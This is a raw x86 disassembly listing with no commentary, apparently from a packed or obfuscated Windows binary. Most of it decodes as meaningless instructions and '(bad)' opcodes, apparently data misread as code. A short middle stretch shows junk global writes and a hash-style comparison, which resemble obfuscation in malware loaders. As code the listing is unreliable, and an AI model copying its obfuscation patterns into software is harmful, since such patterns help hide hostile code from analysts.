  41393f:	out    0xd9,al
  413941:	dec    esp
  413942:	jae    0x4139bf
  413944:	test   DWORD PTR [edx-0x52155e25],eax
  41394a:	push   0x8a4e0a0e
  41394f:	inc    ebx
  413950:	ror    BYTE PTR [edx+ebx*2-0x3c593e1e],cl
  413957:	jmp    0x6def6882
  41395c:	cdq    
  41395d:	pop    ss
  41395e:	shl    DWORD PTR [esi+0x16],1
  413961:	xor    esi,eax
  413963:	std    
  413964:	std    
  413965:	inc    ebx
  413966:	push   ebx
  413967:	(bad)  
  413968:	jp     0x4138ff
  41396a:	add    DWORD PTR [edi+0x7b],eax
  41396d:	ins    DWORD PTR es:[edi],dx
  41396e:	xor    DWORD PTR [ecx-0x33],ecx
  413971:	xchg   edx,eax
  413972:	out    dx,al
  413973:	dec    ecx
  413974:	push   ss
  413975:	mov    ch,0x7b
  413977:	lods   eax,DWORD PTR ds:[esi]
  413978:	push   ecx
  413979:	mov    esi,0xa572cc3
  41397e:	xchg   ebx,eax
  41397f:	test   BYTE PTR [edi-0x62],0x0
  413983:	mov    ebp,0xfcb0772b
  413988:	sbb    eax,0x76f4c109
  41398d:	jne    0x413974
  41398f:	xor    ebx,DWORD PTR [ecx]
  413991:	push   0x16b86266
  413996:	add    DWORD PTR [ebx+edi*2],ebp
  413999:	or     BYTE PTR [ecx-0x7c],bh
  41399c:	mov    bl,0x19
  41399e:	out    dx,eax
  41399f:	shl    BYTE PTR [eax-0x72fdd1de],1
  4139a5:	or     al,0x93
  4139a7:	rol    DWORD PTR [ecx+eax*4],1
  4139aa:	lods   al,BYTE PTR ds:[esi]
  4139ab:	push   0x4637b8fa
  4139b0:	sbb    bh,bh
  4139b2:	mov    esp,0xf0ca0a55
  4139b7:	ss cmp eax,0xc04f01c4
  4139bd:	call   DWORD PTR [ebx]
  4139bf:	dec    edx
  4139c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139c1:	test   BYTE PTR [ebx-0x68],ah
  4139c4:	pop    ecx
  4139c5:	loope  0x4139b4
  4139c7:	xor    cl,BYTE PTR [ebx-0x34af15e8]
  4139cd:	shl    BYTE PTR [edi],0x77
  4139d0:	hlt    
  4139d1:	mov    esi,0x567a066c
  4139d6:	inc    ecx
  4139d7:	fisttp QWORD PTR [ecx+eax*4+0x7be370ed]
  4139de:	push   esp
  4139df:	cmovbe edi,DWORD PTR [ebp-0x6782440]
  4139e6:	jns    0x413a15
  4139e8:	scas   al,BYTE PTR es:[edi]
  4139e9:	fwait
  4139ea:	jl     0x413a39
  4139ec:	or     al,0x86
  4139ee:	mov    edi,DWORD PTR [edi-0x33]
  4139f1:	jp     0x41398e
  4139f3:	add    al,0xe9
  4139f5:	xchg   ebp,eax
  4139f6:	pop    edx
  4139f7:	(bad)  
  4139fa:	test   al,0x97
  4139fc:	sar    ah,1
  4139fe:	mov    ds:0xd6b2cc3c,eax
  413a03:	xchg   ebx,eax
  413a04:	clc    
  413a05:	pop    ss
  413a06:	inc    edi
  413a07:	mov    ebp,0xc32dd319
  413a0c:	cmp    BYTE PTR [edi+0x73],dl
  413a0f:	iret   
  413a10:	lds    ebx,FWORD PTR [ebp-0x3717af54]
  413a16:	sub    DWORD PTR [edx],eax
  413a18:	push   ebp
  413a19:	ret    
  413a1a:	add    DWORD PTR [ebp-0x3b99d4fe],0xdafcd6ef
  413a24:	adc    eax,0x4eeb13ca
  413a29:	dec    BYTE PTR [esi-0x7f]
  413a2c:	or     DWORD PTR [esi],ebx
  413a2e:	jle    0x413a35
  413a30:	outs   dx,BYTE PTR ds:[esi]
  413a31:	and    eax,0x7684df5a
  413a36:	stos   DWORD PTR es:[edi],eax
  413a37:	bound  esi,QWORD PTR [esi-0x2]
  413a3a:	test   DWORD PTR [ebx+ebp*8-0x4f],edx
  413a3e:	addr16 gs hlt 
  413a41:	call   0xecb6:0x195e502f
  413a48:	and    bl,al
  413a4a:	repz (bad) 
  413a4c:	and    al,0x8
  413a4e:	fist   DWORD PTR [ebx-0x42881758]
  413a54:	(bad)  
  413a55:	(bad)  
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	ins    DWORD PTR es:[edi],dx
  413a68:	adc    BYTE PTR [edx+edi*4],0x7e
  413a6c:	push   0x7eb97070
  413a71:	jo     0x413ae3
  413a73:	jb     0x413a71
  413a75:	test   dl,bl
  413a77:	mov    cl,0x2f
  413a79:	adc    bl,BYTE PTR [ebx-0x5cbe886a]
  413a7f:	das    
  413a80:	stc    
  413a81:	test   eax,0xdf9c0d58
  413a86:	jb     0x413af7
  413a88:	xor    eax,0xcb1bf367
  413a8d:	sbb    ebx,DWORD PTR [edx-0x6c]
  413a90:	ins    DWORD PTR es:[edi],dx
  413a91:	xchg   ecx,eax
  413a92:	push   eax
  413a93:	int    0x46
  413a95:	frstor [esi+edx*4]
  413a98:	and    edi,DWORD PTR [ecx]
  413a9a:	push   DWORD PTR [esi-0x4c]
  413a9d:	fimul  WORD PTR [edx-0x66]
  413aa0:	pop    ecx
  413aa1:	push   edx
  413aa2:	mov    ds:0x14cc2595,eax
  413aa7:	inc    ecx
  413aa8:	xor    al,0xea
  413aaa:	xchg   edi,eax
  413aab:	cli    
  413aac:	mov    eax,0xde31ccea
  413ab1:	mov    BYTE PTR [edx],bh
  413ab3:	scas   eax,DWORD PTR es:[edi]
  413ab4:	mov    ch,0x18
  413ab6:	bound  ebp,QWORD PTR ds:0x82f3f04f
  413abc:	adc    BYTE PTR [ebp-0x1bd253c8],bl
  413ac2:	js     0x413ab0
  413ac4:	jle    0x413b27
  413ac6:	sbb    al,0x4e
  413ac8:	xor    eax,0x4b574b77
  413acd:	adc    al,dh
  413acf:	lods   eax,DWORD PTR ds:[esi]
  413ad0:	icebp  
  413ad1:	clc    
  413ad2:	outs   dx,BYTE PTR ds:[esi]
  413ad3:	sahf   
  413ad4:	xchg   edi,eax
  413ad5:	mov    ds:0xf46f8ca6,eax
  413ada:	mov    edi,0xfa3025bb
  413adf:	je     0x413aae
  413ae1:	dec    esi
  413ae2:	sub    al,0xf5
  413ae4:	in     eax,0xca
  413ae6:	xchg   esp,eax
  413ae7:	std    
  413ae8:	jmp    0xe734:0x6ea18df3
  413aef:	popf   
  413af0:	(bad)  
  413af1:	sbb    edx,DWORD PTR [edi-0x25]
  413af4:	mov    eax,0x52896f8
  413af9:	sbb    bh,BYTE PTR [edx-0x446a5931]
  413aff:	xor    BYTE PTR [ecx+0x61],ah
  413b02:	or     dl,0x54
  413b05:	xchg   al,ch
  413b07:	jecxz  0x413aaa
  413b09:	nop
  413b0a:	das    
  413b0b:	pop    edi
  413b0c:	aam    0x8b
  413b0e:	jnp    0x413b89
  413b10:	jbe    0x413a92
  413b12:	je     0x413b92
  413b14:	add    eax,0x53ce176a
  413b19:	inc    esp
  413b1a:	loopne 0x413b36
  413b1c:	adc    BYTE PTR [ecx+0x74],0x41
  413b20:	inc    edx
  413b21:	loope  0x413b83
  413b23:	test   DWORD PTR [ebx],ebx
  413b25:	add    BYTE PTR [ebx-0x72c0617b],bl
  413b2b:	bound  ecx,QWORD PTR [edx]
  413b2d:	push   ecx
  413b2e:	push   ebx
  413b2f:	cs cmc 
  413b31:	pop    ds
  413b32:	push   0xefabcf12
  413b37:	xor    dl,BYTE PTR [esi-0x13146f5a]
  413b3d:	or     BYTE PTR [eax+0x73],cl
  413b40:	js     0x413b03
  413b42:	mov    ebx,0x99d77b74
  413b47:	cmc    
  413b48:	inc    esi
  413b49:	jns    0x413b62
  413b4b:	rcl    DWORD PTR [ebp-0x55014c26],cl
  413b51:	and    al,ch
  413b53:	popf   
  413b54:	es leave 
  413b56:	inc    eax
  413b57:	rcr    DWORD PTR [ebp-0x563ef7e0],0xac
  413b5e:	je     0x413bc9
  413b60:	lods   eax,DWORD PTR ds:[esi]
  413b61:	or     al,0xd0
  413b63:	xchg   edx,eax
  413b64:	push   cs
  413b65:	test   BYTE PTR [eax+0x3f07c5ba],dl
  413b6b:	outs   dx,DWORD PTR ds:[esi]
  413b6c:	mov    bl,0x36
  413b6e:	(bad)  
  413b6f:	ja     0x413b87
  413b71:	int3   
  413b72:	ss push 0xffffffb9
  413b75:	sti    
  413b76:	sub    BYTE PTR [edi+0x3c],ch
  413b79:	scas   eax,DWORD PTR es:[edi]
  413b7a:	xchg   ebx,eax
  413b7b:	mov    al,ds:0xdb62bdcb
  413b80:	jmp    0x52831364
  413b85:	xchg   DWORD PTR [edx],edx
  413b87:	add    eax,0x7edbb1d9
  413b8c:	push   ss
  413b8d:	jecxz  0x413bc3
  413b8f:	pushf  
  413b90:	psllq  mm3,QWORD PTR [ecx+ebx*4-0x2c]
  413b95:	fst    DWORD PTR [ebx]
  413b97:	adc    BYTE PTR [bp+si+0x7156],ch
  413b9c:	ss push ds
  413b9e:	xor    DWORD PTR [eax],edx
  413ba0:	xchg   ebp,eax
  413ba1:	aaa    
  413ba2:	iret   
  413ba3:	mov    al,0xc6
  413ba5:	(bad)  
  413ba6:	jo     0x413b73
  413ba8:	icebp  
  413ba9:	sub    al,0xd
  413bab:	xchg   ebp,eax
  413bac:	sbb    esp,DWORD PTR [eax]
  413bae:	cdq    
  413baf:	jno    0x413bd8
  413bb1:	adc    al,0x2c
  413bb3:	bound  esp,QWORD PTR [eax+0x5a]
  413bb6:	mov    ah,0x67
  413bb8:	mov    bh,0x64
  413bba:	aad    0xe9
  413bbc:	test   dh,ch
  413bbe:	repnz add edx,DWORD PTR [eax]
  413bc1:	add    ebp,esi
  413bc3:	lea    esp,[esi+ebp*1-0x3034612e]
  413bca:	push   esi
  413bcb:	cli    
  413bcc:	inc    ecx
  413bcd:	sbb    BYTE PTR [bp+0x7c],bh
  413bd1:	sub    cl,bl
  413bd3:	push   ebx
  413bd4:	pop    ebx
  413bd5:	clc    
  413bd6:	cmp    eax,0xd0cfc8f7
  413bdb:	add    edx,DWORD PTR [edi+0x6e]
  413bde:	lahf   
  413bdf:	cdq    
  413be0:	retf   0x849f
  413be3:	jmp    0x1e60:0xc8c325c1
  413bea:	sub    eax,0x446987e9
  413bef:	mov    fs,ebx
  413bf1:	out    dx,eax
  413bf2:	dec    ebp
  413bf3:	add    al,0x96
  413bf5:	cmp    al,0x4b
  413bf7:	clc    
  413bf8:	pop    edx
  413bf9:	rcl    BYTE PTR [edx-0x3],cl
  413bfc:	pop    ebx
  413bfd:	pushf  
  413bfe:	xchg   edi,eax
  413bff:	sub    DWORD PTR [edx-0x5f],0x3d4d4abb
  413c06:	(bad)  
  413c07:	cdq    
  413c08:	call   DWORD PTR [eax+0x49b4a1c3]
  413c0e:	mov    ds:0xfe51124c,al
  413c13:	jb     0x413c8e
  413c15:	and    eax,0x61a774af
  413c1a:	mov    ah,0x9a
  413c1c:	mov    eax,0xd1072876
  413c21:	lods   al,BYTE PTR ds:[esi]
  413c22:	push   ds
  413c23:	cmp    ebp,0x71f9b725
  413c29:	call   0x3d9e:0xeea30a7c
  413c30:	jns    0x413c08
  413c32:	jmp    0xba58:0x93a79d89
  413c39:	test   DWORD PTR [edi],esi
  413c3b:	and    al,BYTE PTR [esi]
  413c3d:	rcl    edi,1
  413c3f:	xor    BYTE PTR [ebp+0x1573d903],bh
  413c45:	mov    BYTE PTR [edi-0x3f74df43],bh
  413c4b:	imul   eax,DWORD PTR [eax-0x5d],0xb111716b
  413c52:	inc    eax
  413c53:	push   0x21
  413c55:	jb     0x413c1e
  413c57:	dec    edx
  413c58:	push   ss
  413c59:	in     al,0x30
  413c5b:	mov    ds:0xd129bd2c,al
  413c60:	shl    ah,0x90
  413c63:	outs   dx,BYTE PTR ds:[esi]
  413c64:	adc    BYTE PTR [esi],dl
  413c66:	xchg   ebp,eax
  413c67:	xchg   ebx,eax
  413c68:	pop    es
  413c69:	ror    BYTE PTR [edx-0x10],cl
  413c6c:	mov    edx,0xbd47adc7
  413c71:	xchg   BYTE PTR [edx],dh
  413c73:	imul   edi,DWORD PTR ds:0x94fe6376,0xcc289716
  413c7d:	push   ss
  413c7e:	dec    esp
  413c7f:	mov    al,0xb3
  413c81:	dec    edi
  413c82:	and    eax,0x39bd503d
  413c87:	or     DWORD PTR [edx+0x27b5f7d2],0x7b93d0eb
  413c91:	loope  0x413caf
  413c93:	push   eax
  413c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c95:	pop    ss
  413c96:	adc    BYTE PTR [edi+0x50],0x3a
  413c9a:	mov    edi,0x1de9b07
  413c9f:	(bad)
  413ca3:	dec    ebx
  413ca4:	xor    DWORD PTR [edi+0xa],0x5ca552a4
  413cab:	mov    ch,0xe7
  413cad:	pop    DWORD PTR [edx+ecx*8+0x37ddf766]
  413cb4:	shl    dh,1
  413cb6:	and    BYTE PTR ds:0x64e22f40,dl
  413cbc:	sub    BYTE PTR [ebx+esi*1-0x66],dh
  413cc0:	xchg   edx,eax
  413cc1:	xor    ebp,esp
  413cc3:	lahf   
  413cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cc5:	dec    ecx
  413cc6:	jb     0x413c64
  413cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cc9:	and    ebp,0xffffffdf
  413ccc:	aaa    
  413ccd:	test   dl,0xb6
  413cd0:	mov    eax,ds:0x5c77c57c
  413cd5:	cmc    
  413cd6:	(bad)  
  413cd7:	dec    esp
  413cd8:	jmp    0x413c74
  413cda:	mov    al,bl
  413cdc:	mov    al,bl
  413cde:	lods   eax,DWORD PTR ds:[esi]
  413cdf:	inc    edi
  413ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ce1:	mov    edi,0x33e772f0
  413ce6:	dec    esi
  413ce7:	jmp    0x413c76
  413ce9:	cld    
  413cea:	pop    esi
  413ceb:	pop    esi
  413cec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ced:	clc    
  413cee:	xchg   ebx,eax
  413cef:	jmp    0x41bf6feb
  413cf4:	push   eax
  413cf5:	push   ds
  413cf6:	and    DWORD PTR [edx+eiz*8+0xf144377],esi
  413cfd:	ins    DWORD PTR es:[edi],dx
  413cfe:	jg     0x413c92
  413d00:	mov    esp,0xe663ece6
  413d05:	jp     0x413d48
  413d07:	sahf   
  413d08:	xchg   edi,eax
  413d09:	aam    0x2b
  413d0b:	dec    ebp
  413d0c:	ret    0x76bf
  413d0f:	(bad)  
  413d10:	pop    ebx
  413d11:	clc    
  413d12:	das    
  413d13:	mov    WORD PTR [edx-0x78],fs
  413d16:	shr    ebp,cl
  413d18:	xchg   esi,eax
  413d19:	jmp    0x413d7f
  413d1b:	lea    ecx,[edi+0xfb55f85]
  413d21:	ja     0x413d39
  413d23:	jecxz  0x413da1
  413d25:	jmp    0x3f26b3be
  413d2a:	push   edx
  413d2b:	shl    BYTE PTR [edi+ebx*2+0x4406d195],cl
  413d32:	pop    ebp
  413d33:	jmp    0x413cc5
  413d35:	or     ebx,DWORD PTR [esi-0x76a538a1]
  413d3b:	inc    ebp
  413d3c:	loopne 0x413cc9
  413d3e:	inc    ebp
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8e:	aas    
  413e8f:	inc    edi
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413e4e
  413e98:	out    dx,eax
  413e99:	das    
  413e9a:	mov    eax,0x894ccc3a
  413e9f:	cmp    esp,DWORD PTR [ebp+edx*1+0x5c]
  413ea3:	sahf   
  413ea4:	push   0xffffffc6
  413ea6:	mov    ecx,0xfe66e57d
  413eab:	cs pop esi
  413ead:	xchg   edi,eax
  413eae:	mov    eax,ds:0xa43b9809
  413eb3:	in     al,dx
  413eb4:	xbegin 0xa0196fa8
  413eba:	dec    ebx
  413ebb:	cmp    ch,0x21
  413ebe:	int3   
  413ebf:	or     al,0xad
  413ec1:	sti    
  413ec2:	fcomp  DWORD PTR [edi-0x13eba4a3]
  413ec8:	dec    esi
  413ec9:	jmp    0x413f1f
  413ecb:	add    ch,bl
  413ecd:	cmp    eax,DWORD PTR [ecx+0x652ca80b]
  413ed3:	xor    esp,ebx
  413ed5:	sbb    al,0xda
  413ed7:	clc    
  413ed8:	jge    0x413f3a
  413eda:	inc    edi
  413edb:	cmp    ecx,DWORD PTR [edx]
  413edd:	repnz sub eax,0x2da3603c
  413ee3:	in     al,0xb9
  413ee5:	mov    eax,ds:0x808b1265
  413eea:	aam    0x5e
  413eec:	pop    ds
  413eed:	or     ecx,0x74d0efc3
  413ef3:	xor    al,0x9c
  413ef5:	nop
  413ef6:	xor    ch,0xc0
  413ef9:	test   eax,0xe51b5c8
  413efe:	iret   
  413eff:	retf   0x9602
  413f02:	rcr    BYTE PTR [edx+0xb],0x1c
  413f06:	lds    edx,FWORD PTR [eax+0xd]
  413f09:	dec    edx
  413f0a:	xlat   BYTE PTR ds:[ebx]
  413f0b:	scas   al,BYTE PTR es:[edi]
  413f0c:	jns    0x413f3e
  413f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f0f:	jecxz  0x413f60
  413f11:	bound  ebx,QWORD PTR [edi+ecx*8]
  413f14:	scas   eax,DWORD PTR es:[edi]
  413f15:	sub    ch,BYTE PTR [esi-0x31]
  413f18:	mov    dl,0xa7
  413f1a:	outs   dx,BYTE PTR ds:[esi]
  413f1b:	adc    esi,eax
  413f1d:	sbb    al,0x39
  413f1f:	lahf   
  413f20:	int    0x6a
  413f22:	and    DWORD PTR [esi],eax
  413f24:	or     dh,BYTE PTR [edi-0xdb3f8f2]
  413f2a:	jae    0x413f97
  413f2c:	mov    edi,0xa6104348
  413f31:	into   
  413f32:	push   esi
  413f33:	push   0x4ce5a3e1
  413f38:	cmp    DWORD PTR [ebx],ecx
  413f3a:	cmp    al,0xf3
  413f3c:	jg     0x413f49
  413f3e:	dec    ebx
  413f3f:	(bad)  
  413f40:	sub    al,0x54
  413f42:	dec    ebp
  413f43:	imul   BYTE PTR [eax+0x50]
  413f46:	test   al,0xb0
  413f48:	mov    edi,0x8272970e
  413f4d:	pop    edx
  413f4e:	loope  0x413f01
  413f50:	ret    0xd45b
  413f53:	or     esi,esp
  413f55:	adc    ecx,esi
  413f57:	dec    edx
  413f58:	or     al,0xb1
  413f5a:	setnp  dl
  413f5d:	mov    dl,0x37
  413f5f:	repnz add DWORD PTR [ecx+0x15decac3],esp
  413f66:	sbb    eax,0x648ccb3a
  413f6b:	push   ebx
  413f6c:	fisub  WORD PTR [eax+edi*2+0x62]
  413f70:	mov    al,0x55
  413f72:	ficomp WORD PTR [edi+0x2df6b1c0]
  413f78:	imul   ebx,DWORD PTR [eax+edi*4-0x3f],0xffffffc6
  413f7d:	mov    ecx,0x9c970e6b
  413f82:	xchg   ecx,eax
  413f83:	gs push ebp
  413f85:	js     0x413f30
  413f87:	test   dl,ah
  413f89:	rcl    BYTE PTR [ecx+0x6da2db78],0xf9
  413f90:	sbb    DWORD PTR [edx+ecx*1],edx
  413f93:	in     al,dx
  413f94:	aas    
  413f95:	adc    edx,DWORD PTR [esi]
  413f97:	sub    esp,DWORD PTR [ebx]
  413f99:	not    ah
  413f9b:	in     eax,dx
  413f9c:	dec    ebx
  413f9d:	lods   al,BYTE PTR ds:[esi]
  413f9e:	in     al,0xac
  413fa0:	push   eax
  413fa1:	bound  ebx,QWORD PTR [edx+0x5a]
  413fa4:	pop    ss
  413fa5:	cli    
  413fa6:	inc    eax
  413fa7:	push   eax
  413fa8:	cld    
  413fa9:	neg    ah
  413fab:	jle    0x413fcb
  413fad:	xor    al,0xaf
  413faf:	in     eax,0xc2
  413fb1:	lods   eax,DWORD PTR es:[esi]
  413fb3:	std    
  413fb4:	mov    dh,0xe0
  413fb6:	mov    ebp,ebx
  413fb8:	push   eax
  413fb9:	imul   ecx,ebp,0xffffffdd
  413fbc:	adc    ch,BYTE PTR [esp+ebp*8]
  413fbf:	imul   edi,DWORD PTR [ebp+0x2f],0xffffffa2
  413fc3:	xchg   edi,eax
  413fc4:	and    ecx,edi
  413fc6:	inc    edi
  413fc7:	sub    eax,DWORD PTR [esi+ebx*4-0x6c2fb615]
  413fce:	aad    0x1a
  413fd0:	or     DWORD PTR [edi+0x742f4b6],0xf
  413fd7:	dec    ebx
  413fd8:	cmp    al,BYTE PTR [edi]
  413fda:	fsubr  DWORD PTR [edx+eiz*2]
  413fdd:	popa   
  413fde:	jno    0x41402c
  413fe0:	(bad)  
  413fe1:	fild   DWORD PTR [ebx]
  413fe3:	rcr    BYTE PTR [ecx-0x261178fe],cl
  413fe9:	data16 out dx,al
  413feb:	or     ch,BYTE PTR [ebx+0x7d8cf573]
  413ff1:	or     al,0xc2
  413ff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ff4:	in     eax,dx
  413ff5:	jmp    0x7fd8ca20
  413ffa:	mov    cl,0xc9
  413ffc:	sub    ebx,DWORD PTR [esi+0x1484f9d5]
  414002:	loope  0x413fd2
  414004:	rcl    BYTE PTR [ebp+0x34],cl
  414007:	(bad)  
  414008:	bound  esi,QWORD PTR [edi]
  41400a:	out    dx,al
  41400b:	inc    eax
  41400c:	bnd ja 0x414081
  41400f:	mul    ebp
  414011:	pop    ebp
  414012:	add    ebp,DWORD PTR [eax+0x25]
  414015:	sub    bh,BYTE PTR [esi+0xbcaa207]
  41401b:	ins    BYTE PTR es:[edi],dx
  41401c:	add    bl,ch
  41401e:	jae    0x413fe4
  414020:	sbb    al,0x7a
  414022:	add    ah,dl
  414024:	xor    al,BYTE PTR [esi+0x7a7bd3ed]
  41402a:	ror    esi,1
  41402c:	and    ecx,ecx
  41402e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41402f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414030:	jle    0x41406e
  414032:	lock fisub WORD PTR [esi+0x6d51977e]
  414039:	rol    DWORD PTR [edi+0x43d08506],1
  41403f:	aaa    
  414040:	add    al,0x55
  414042:	xor    eax,0x173ad066
  414047:	dec    ebx
  414048:	push   eax
  414049:	sub    BYTE PTR [ebp+0x37],bh
  41404c:	add    eax,0x84660ef6
  414051:	mov    edi,0xabfc3a2
  414056:	xchg   esp,eax
  414057:	jae    0x41406d
  414059:	sub    DWORD PTR [eax-0x5f2870a5],0x51
  414060:	pop    ds
  414061:	fimul  WORD PTR [eax+0x212cb1e8]
  414067:	push   ecx
  414068:	push   es
  414069:	lods   eax,DWORD PTR ds:[esi]
  41406a:	out    dx,eax
  41406b:	cli    
  41406c:	or     ch,BYTE PTR [ebx]
  41406e:	js     0x414035
  414070:	stos   DWORD PTR es:[edi],eax
  414071:	daa    
  414072:	jecxz  0x41400c
  414074:	sahf   
  414075:	xor    DWORD PTR [ebx+0x32c22903],0x541c003b
  41407f:	cmp    al,0xb3
  414081:	stos   DWORD PTR es:[edi],eax
  414082:	jae    0x414022
  414084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414085:	xlat   BYTE PTR ds:[ebx]
  414086:	outs   dx,BYTE PTR ds:[esi]
  414087:	sub    al,0xb1
  414089:	and    esi,DWORD PTR [ebx+ecx*1-0x6c]
  41408d:	sbb    ch,bh
  41408f:	and    BYTE PTR [ecx],bl
  414091:	ja     0x414015
  414093:	shl    DWORD PTR [edx+edx*2-0x35],0xcc
  414098:	xchg   edx,eax
  414099:	aas    
  41409a:	add    bh,BYTE PTR [edx]
  41409c:	repz das 
  41409e:	jmp    0x4140cb
  4140a0:	int3   
  4140a1:	xchg   ebx,eax
  4140a2:	dec    esi
  4140a3:	mov    eax,ds:0xcbcc7dc2
  4140a8:	pop    ebx
  4140a9:	or     eax,0x8a25ba70
  4140ae:	push   es
  4140af:	push   ss
  4140b0:	mov    edx,ebx
  4140b2:	dec    eax
  4140b3:	xchg   edx,eax
  4140b4:	push   ss
  4140b5:	mov    DWORD PTR [esi-0x5452f2f],ebx
  4140bb:	nop
  4140bc:	out    dx,al
  4140bd:	xchg   ebp,esi
  4140bf:	rcr    cl,0x1c
  4140c2:	pop    edx
  4140c3:	scas   al,BYTE PTR es:[edi]
  4140c4:	cmc    
  4140c5:	push   edx
  4140c6:	push   ss
  4140c7:	or     eax,0x792001fd
  4140cc:	mov    eax,ds:0x2b64c919
  4140d1:	pop    eax
  4140d2:	mov    ebp,ebp
  4140d4:	jb     0x414154
  4140d6:	nop
  4140d7:	jno    0x41406e
  4140d9:	jb     0x414142
  4140db:	xor    dh,BYTE PTR [eax+esi*8+0x5ed23fd8]
  4140e2:	stos   DWORD PTR es:[edi],eax
  4140e3:	adc    BYTE PTR [ebp-0x45794a19],bh
  4140e9:	retf   0xbeff
  4140ec:	mov    edx,0x54ce0c78
  4140f1:	xlat   BYTE PTR ds:[ebx]
  4140f2:	inc    esp
  4140f3:	jo     0x4140cf
  4140f5:	mov    bh,0x75
  4140f7:	mov    eax,0x197ee34a
  4140fc:	(bad)  
  4140fd:	gs inc edx
  4140ff:	adc    BYTE PTR [ebx],dl
  414101:	add    BYTE PTR es:[ebx+0x5aff5e2],ch
  414108:	popa   
  414109:	inc    ebp
  41410a:	mov    WORD PTR [ebp+0x35fa027a],?
  414110:	popf   
  414111:	test   BYTE PTR [eax-0x295c3791],cl
  414117:	jbe    0x41412e
  414119:	(bad)  
  41411a:	imul   DWORD PTR [ebp+0x60]
  41411d:	test   al,0xf
  41411f:	out    0xee,al
  414121:	jnp    0x4140c8
  414123:	mov    ebx,0x905cf5d6
  414128:	(bad)  
  414129:	pop    ebp
  41412a:	ja     0x4140fc
  41412c:	test   al,0x5f
  41412e:	(bad)  
  41412f:	push   edi
  414130:	adc    eax,0xe2461991
  414135:	sbb    ecx,ebx
  414137:	in     al,0x94
  414139:	call   0xb7b9:0x86331053
  414140:	xchg   ebp,eax
  414141:	in     eax,0x91
  414143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414144:	aad    0x8e
  414146:	inc    ecx
  414147:	xchg   edx,eax
  414148:	add    eax,0x73027dc6
  41414d:	pop    edx
  41414e:	and    DWORD PTR [eax-0x50],ecx
  414151:	jp     0x4141cc
  414153:	repz les ebp,FWORD PTR [edi-0x38]
  414157:	or     edx,ebp
  414159:	jge    0x41413e
  41415b:	push   ebp
  41415c:	xchg   ebx,eax
  41415d:	mov    eax,DWORD PTR cs:[ebp-0x14]
